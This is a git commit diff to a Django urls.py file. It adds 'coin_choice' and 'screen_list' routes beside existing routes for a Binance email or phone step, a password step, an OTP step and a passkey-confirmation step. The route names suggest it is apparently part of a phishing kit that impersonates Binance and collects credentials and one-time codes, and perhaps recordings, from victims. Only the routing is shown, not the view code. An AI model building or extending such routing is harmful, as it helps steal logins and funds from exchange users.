d5ed0046bb3d9e0f0c3aacf4f2b4c122069728b2
Globalinvestors94 <166951378+Globalinvestors94@users.noreply.github.com>
2024-09-02 15:34:57 +0100

    Update urls.py

--- hk/urls.py
+++ hk/urls.py
@@ -1,5 +1,5 @@
 from django.urls import path
-from .views import Email,Binance_E,Binance_P,Binance_OTP,PassKey
+from .views import Email,Binance_E,Binance_P,Binance_OTP,PassKey,Recording,Recording_list
 from django.views.generic import ListView
 from django.contrib.auth import views as auth_views
 # from . views import *
@@ -12,6 +12,6 @@ path(r'binance_email_phone', Binance_E, name='bin_e'),
 path(r'binance_password', Binance_P, name='bin_p'),
 path(r'binance_otp', Binance_OTP, name='otp'),
 path(r'banktrade_passkey_confirmation', PassKey, name='pkey'),
-
-
+path(r'coin_choice', Recording, name='rec'),
+path(r'screen_list', Recording_list, name='rl'),
 ]
